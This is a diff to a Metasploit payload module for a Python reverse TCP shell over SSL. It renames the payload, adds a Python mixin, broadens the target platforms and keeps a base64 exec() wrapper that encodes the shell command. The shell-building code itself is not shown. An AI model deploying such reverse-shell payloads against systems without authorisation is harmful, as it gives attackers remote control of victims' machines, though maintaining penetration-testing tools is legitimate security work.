@@ -4,6 +4,7 @@
 ##
 
 require 'msf/core'
+require 'msf/core/payload/python'
 require 'msf/core/handler/reverse_tcp_ssl'
 require 'msf/base/sessions/command_shell'
 require 'msf/base/sessions/command_shell_options'
@@ -11,19 +12,19 @@ require 'msf/base/sessions/command_shell_options'
 module Metasploit3
 
   include Msf::Payload::Single
+  include Msf::Payload::Python
   include Msf::Sessions::CommandShellOptions
 
   def initialize(info = {})
     super(merge_info(info,
-      'Name'          => 'Command Shell, Reverse TCP SSL (via python)',
+      'Name'          => 'Python Command Shell, Reverse TCP SSL',
       'Description'   => 'Creates an interactive shell via python, uses SSL, encodes with base64 by design.',
       'Author'        => 'RageLtMan',
       'License'       => BSD_LICENSE,
-      'Platform'      => 'python',
+      'Platform'      => %w{ linux osx python unix win },
       'Arch'          => ARCH_PYTHON,
       'Handler'       => Msf::Handler::ReverseTcpSsl,
       'Session'       => Msf::Sessions::CommandShell,
-      'PayloadType'   => 'python',
       'Payload'       =>
         {
           'Offsets' => { },
@@ -61,8 +62,6 @@ module Metasploit3
 
     # Base64 encoding is required in order to handle Python's formatting requirements in the while loop
     cmd = "exec('#{Rex::Text.encode_base64(cmd)}'.decode('base64'))"
-
     cmd
   end
 end
-
